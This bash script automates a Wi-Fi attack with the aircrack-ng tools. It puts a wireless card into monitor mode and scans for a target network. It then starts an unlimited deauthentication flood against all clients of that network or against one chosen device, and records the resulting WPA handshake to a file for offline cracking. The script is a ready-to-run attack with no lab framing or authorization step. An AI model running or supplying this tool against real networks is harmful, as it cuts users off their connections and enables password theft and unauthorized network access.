#!/bin/bash

# Kill processes
sudo airmon-ng check kill

echo -n "Enter network interface: "
read wireless_interface

# Start monitor mode
sudo airmon-ng start "$wireless_interface"

echo -en "\nEnter name of the interface that is on monitor mode: "
read monitor_interface

echo -n "Enter \"q\" two times to quit from capturing BSSID: "
sleep 1

# Capturing BSSID
sudo airodump-ng "$monitor_interface"

echo -en "\nEnter BSSID: "
read bssid

echo -n "Enter Channel number: "
read c

# Input validation for channel number
re='^[0-9]+$'
if ! [[ $c =~ $re ]]; then
    echo "Error: Channel must be a number."
    exit 1
fi

echo -n "Enter file name to save captured files: "
read filename

echo -e "Options:
                1. Deauth all devices Connected to the network
                2. Deauth specified device"
echo -n "Your choice: "
read choice

if [ "$choice" = 2 ]; then
    echo -n "Enter BSSID of the device: "
    read devBssid
fi

echo -n "Enter \"q\" two times to quit after capturing Handshake"
sleep 1

# Deauthentication Attack
if [ "$choice" = 1 ]; then
    gnome-terminal -- sudo aireplay-ng --deauth 0 -a "$bssid" "$monitor_interface" &
    
elif [ "$choice" = 2 ]; then
    gnome-terminal -- sudo aireplay-ng --deauth 0 -a "$bssid" -c "$devBssid" "$monitor_interface" &

fi

# Capturing Handshake
sudo airodump-ng -w "$filename" -c "$c" --bssid "$bssid" "$monitor_interface"
